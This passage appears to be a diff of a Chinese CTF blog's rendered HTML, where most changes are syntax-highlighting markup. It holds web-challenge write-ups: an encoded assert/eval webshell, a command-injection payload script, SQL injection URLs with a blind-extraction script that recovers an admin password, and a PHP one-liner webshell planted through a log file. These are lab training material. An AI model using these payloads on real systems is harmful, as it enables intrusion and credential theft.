-  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;
+  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;
     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);
   &#125;
   @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);
 &#125;<span class="hljs-keyword">else</span>&#123;
-    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
 &#125;
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
@@ -610,15 +610,15 @@ $&#123;<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</sp
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207214024481.png" srcset="/img/loading.gif" alt="image-20210207214024481"></p>
 <p>构造shell用蚁剑连接</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
-error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
 
 <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;
-<span class="hljs-variable">$b</span>=urlencode(~<span class="hljs-variable">$a</span>);
+<span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);
 <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;
 
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
 <span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;(eval($_POST[&quot;test&quot;]))&#x27;</span>;
-<span class="hljs-variable">$d</span>=urlencode(~<span class="hljs-variable">$c</span>);
+<span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$c</span>);
 <span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>;
  
  <span class="hljs-meta">?&gt;</span></code></pre></div>
@@ -640,10 +640,10 @@ error_reporting(<span class="hljs-number">0</span>);
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207224748880.png" srcset="/img/loading.gif" alt="image-20210207224748880"></p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210207224206612.png" srcset="/img/loading.gif" alt="image-20210207224206612"></p>
 <h1 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h1><p>要求输入json格式的命令</p>
-<p>最简单的形式，可以用下面这样的 JSON 表示 “名称 / 值对” ：{ “firstName”: “Brett” }</p>
+<p>最简单的形式，可以用下面这样的 JSON 表示 “名称 &#x2F; 值对” ：{ “firstName”: “Brett” }</p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210208220310475.png" srcset="/img/loading.gif" alt="image-20210208220310475"></p>
 <p>输入</p>
-<div class="hljs"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;ls&quot;</span>&#125;</code></pre></div>
+<div class="hljs"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ls&quot;</span><span class="hljs-punctuation">&#125;</span></code></pre></div>
 
 <p>会显示出index.php，没有其他的文件了</p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210208221222172.png" srcset="/img/loading.gif" alt="image-20210208221222172"></p>
@@ -652,20 +652,20 @@ error_reporting(<span class="hljs-number">0</span>);
 <p>网上找到了源码</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-putenv(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);
+<span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);
 
 <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;
   <span class="hljs-variable">$json</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];
 
-  <span class="hljs-keyword">if</span> (!is_string(<span class="hljs-variable">$json</span>)) &#123;
+  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$json</span>)) &#123;
     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;
-  &#125; <span class="hljs-keyword">elseif</span> (preg_match(<span class="hljs-string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;
+  &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;
     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;
   &#125; <span class="hljs-keyword">else</span> &#123;
     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;
-    <span class="hljs-variable">$cmd</span> = json_decode(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];
+    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];
     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cmd</span> !== <span class="hljs-literal">NULL</span>) &#123;
-      system(<span class="hljs-variable">$cmd</span>);
+      <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);
     &#125; <span class="hljs-keyword">else</span> &#123;
       <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid input&#x27;</span>;
     &#125;
@@ -690,7 +690,7 @@ payload = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /
 
 res = requests.post(<span class="hljs-string">&quot;http://2526ca08-39b8-48c4-8385-e8c5d4b5dfd7.node3.buuoj.cn/&quot;</span>, data=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:payload&#125;)
 <span class="hljs-comment">#需要使用POST方式，因为get不能提交这么大的数据</span>
-print(res.text)</code></pre></div>
+<span class="hljs-built_in">print</span>(res.text)</code></pre></div>
 
 
 
@@ -715,32 +715,32 @@ print(res.text)</code></pre></div>
 <span class="hljs-variable">$id</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]:<span class="hljs-string">&quot;1&quot;</span>;
 <span class="hljs-variable">$path</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>;
 
-<span class="hljs-variable">$id</span>=addslashes(<span class="hljs-variable">$id</span>);
-<span class="hljs-variable">$path</span>=addslashes(<span class="hljs-variable">$path</span>);
+<span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$id</span>);
+<span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$path</span>);
 
-<span class="hljs-variable">$id</span>=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);
-<span class="hljs-variable">$path</span>=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$path</span>);
+<span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);
+<span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$path</span>);
 
-<span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);
-<span class="hljs-variable">$row</span>=mysqli_fetch_array(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);
+<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);
+<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);
 
 <span class="hljs-variable">$path</span>=<span class="hljs-string">&quot;./&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>];
-header(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);
-readfile(<span class="hljs-variable">$path</span>);</code></pre></div>
+<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);
+<span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$path</span>);</code></pre></div>
 
 
 
 <h2 id="0x1-sql注入"><a href="#0x1-sql注入" class="headerlink" title="0x1 sql注入"></a>0x1 sql注入</h2><p>很明显是存在sql注入的，但是这里对输入的id参数进行了过滤，过滤了 <code>\0,&#39;,\&#39;</code>等</p>
 <p>但是由于存在转义函数addslashes以及<code>\0 &#39;</code>等也被过滤</p>
 <p>构造payload</p>
-<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://d<span class="hljs-number">25</span>c<span class="hljs-number">0</span>ff<span class="hljs-number">4</span>-f<span class="hljs-number">5</span>be-<span class="hljs-number">4</span>d<span class="hljs-number">29</span>-<span class="hljs-number">9985</span>-a<span class="hljs-number">6474788</span>f<span class="hljs-number">806</span>.node<span class="hljs-number">3</span>.buuoj.cn/image.php?id=\<span class="hljs-number">0</span>&#x27;&amp;path= or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>%<span class="hljs-number">23</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://d25c0ff4-f5be-<span class="hljs-number">4</span>d29-<span class="hljs-number">9985</span>-a6474788f806.node3.buuoj.cn/image.php?id=\<span class="hljs-number">0</span>&#x27;&amp;path= or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>%<span class="hljs-number">23</span></code></pre></div>
 
 <p>sql查询语句为</p>
 <div class="hljs"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> images <span class="hljs-keyword">where</span> id=<span class="hljs-string">&#x27;\&#x27; or path=&#x27;</span> or <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span></code></pre></div>
 
 <p>从数据库中获取密码</p>
 <p>首先测试密码长度</p>
-<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://d<span class="hljs-number">25</span>c<span class="hljs-number">0</span>ff<span class="hljs-number">4</span>-f<span class="hljs-number">5</span>be-<span class="hljs-number">4</span>d<span class="hljs-number">29</span>-<span class="hljs-number">9985</span>-a<span class="hljs-number">6474788</span>f<span class="hljs-number">806</span>.node<span class="hljs-number">3</span>.buuoj.cn/image.php?id=\<span class="hljs-number">0</span>%<span class="hljs-number">27</span>&amp;path=%<span class="hljs-number">20</span>or%<span class="hljs-number">20</span>length((select group_concat(password) from users))=<span class="hljs-number">20</span>%<span class="hljs-number">23</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://d25c0ff4-f5be-<span class="hljs-number">4</span>d29-<span class="hljs-number">9985</span>-a6474788f806.node3.buuoj.cn/image.php?id=\<span class="hljs-number">0</span>%<span class="hljs-number">27</span>&amp;path=%<span class="hljs-number">20</span>or%<span class="hljs-number">20</span>length((select group_concat(password) from users))=<span class="hljs-number">20</span>%<span class="hljs-number">23</span></code></pre></div>
 
 <p>当长度为20时，页面显示图片，说明长度为20</p>
 <p>编写脚本获取密码</p>
@@ -755,7 +755,7 @@ result = <span class="hljs-string">&quot;&quot;</span>
     mid = (l + r)&gt;&gt;<span class="hljs-number">1</span>
     <span class="hljs-keyword">while</span>(l&lt;r):
         payloads = payload.<span class="hljs-built_in">format</span>(i,mid)
-        print(url+payloads)
+        <span class="hljs-built_in">print</span>(url+payloads)
         html = requests.get(url+payloads)
         <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JFIF&quot;</span> <span class="hljs-keyword">in</span> html.text:
             l = mid +<span class="hljs-number">1</span>
@@ -763,25 +763,25 @@ result = <span class="hljs-string">&quot;&quot;</span>
             r = mid
         mid = (l + r)&gt;&gt;<span class="hljs-number">1</span>
     result+=<span class="hljs-built_in">chr</span>(mid)
-    print(result)</code></pre></div>
+    <span class="hljs-built_in">print</span>(result)</code></pre></div>
 
 <p>获取的账号密码</p>
-<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>: admin 
-<span class="hljs-attribute">password</span>: <span class="hljs-number">2</span>bab<span class="hljs-number">3</span>f<span class="hljs-number">14</span>b<span class="hljs-number">41</span>e<span class="hljs-number">46436896</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> admin 
+<span class="hljs-symbol">password:</span> <span class="hljs-number">2</span>bab3f14b41e46436896</code></pre></div>
 
 <p>登录后可以发现是文件上传的页面</p>
 <h2 id="0x2-文件上传"><a href="#0x2-文件上传" class="headerlink" title="0x2 文件上传"></a>0x2 文件上传</h2><p>上传php文件发现不行，就随随便上传一个txt文件，可以发现会将文件名写入日志文件，而这个日志文件又是php类型的文件，所以只需要将文件名改为一句话木马即可将日志文件当作我们可以利用的木马文件</p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210209231942874.png" srcset="/img/loading.gif" alt="image-20210209231942874"></p>
 <p>直接将文件名改为一句话木马发现存在过滤，使用短标签</p>
-<div class="hljs"><pre><code class="hljs php-template"><span class="xml">filename=&quot;</span><span class="php"><span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs php-template"><span class="language-xml">filename=&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span></code></pre></div>
 
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210209233930429.png" srcset="/img/loading.gif" alt="image-20210209233930429"></p>
 <p>之后蚁剑连接</p>
-<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">2</span>ff<span class="hljs-number">2</span>b<span class="hljs-number">0</span>ba-<span class="hljs-number">2</span>e<span class="hljs-number">9</span>e-<span class="hljs-number">4671</span>-ab<span class="hljs-number">7</span>c-a<span class="hljs-number">547</span>f<span class="hljs-number">3</span>b<span class="hljs-number">6</span>e<span class="hljs-number">80</span>b.node<span class="hljs-number">3</span>.buuoj.cn/logs/upload.<span class="hljs-number">5874</span>e<span class="hljs-number">8</span>eeee<span class="hljs-number">7</span>baaa<span class="hljs-number">825</span>eed<span class="hljs-number">3</span>a<span class="hljs-number">08</span>e<span class="hljs-number">0976</span>bf.log.php</code></pre></div>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">2</span>ff2b0ba-<span class="hljs-number">2</span>e9e-<span class="hljs-number">4671</span>-ab7c-a547f3b6e80b.node3.buuoj.cn/logs/upload.<span class="hljs-number">5874</span>e8eeee7baaa825eed3a08e0976bf.log.php</code></pre></div>
 
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210209234015975.png" srcset="/img/loading.gif" alt="image-20210209234015975"></p>
 <h1 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h1><p>查看源码发现提示 <code>?secret</code></p>
-<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">eth0</span>      Link encap:Ethernet  HWaddr <span class="hljs-number">02</span>:<span class="hljs-number">42</span>:<span class="hljs-number">0</span>a:c<span class="hljs-number">0</span>:<span class="hljs-number">22</span>:<span class="hljs-number">09</span>  
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">eth0</span>      Link encap:Ethernet  HWaddr <span class="hljs-number">02</span>:<span class="hljs-number">42</span>:<span class="hljs-number">0</span>a:c0:<span class="hljs-number">22</span>:<span class="hljs-number">09</span>  
           <span class="hljs-attribute">inet</span> addr:<span class="hljs-number">10.192.34.9</span>  Bcast:<span class="hljs-number">10.192.34.255</span>  Mask:<span class="hljs-number">255.255.255.0</span>
           <span class="hljs-attribute">UP</span> BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1450</span>  Metric:<span class="hljs-number">1</span>
           <span class="hljs-attribute">RX</span> packets:<span class="hljs-number">22</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> frame:<span class="hljs-number">0</span>
@@ -812,25 +812,25 @@ result = <span class="hljs-string">&quot;&quot;</span>
 
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;  
-    <span class="hljs-variable">$ch</span> = curl_init();
-    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
-    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
-    <span class="hljs-keyword">echo</span> curl_exec(<span class="hljs-variable">$ch</span>);
-    curl_close(<span class="hljs-variable">$ch</span>);
+    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
+    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
+    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);
+    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);
 &#125;
 
 <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
 		<span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];
 		<span class="hljs-comment">//echo $url.&quot;\n&quot;;</span>
-		<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, <span class="hljs-variable">$url</span>,<span class="hljs-variable">$match</span>))
+		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, <span class="hljs-variable">$url</span>,<span class="hljs-variable">$match</span>))
 		&#123;
 			<span class="hljs-comment">//var_dump($match);</span>
 			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;别这样&#x27;</span>);
 		&#125;
-		curl(<span class="hljs-variable">$url</span>);
+		<span class="hljs-title function_ invoke__">curl</span>(<span class="hljs-variable">$url</span>);
 &#125;
 <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;secret&#x27;</span>]))&#123;
-	system(<span class="hljs-string">&#x27;ifconfig&#x27;</span>);
+	<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ifconfig&#x27;</span>);
 &#125;
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
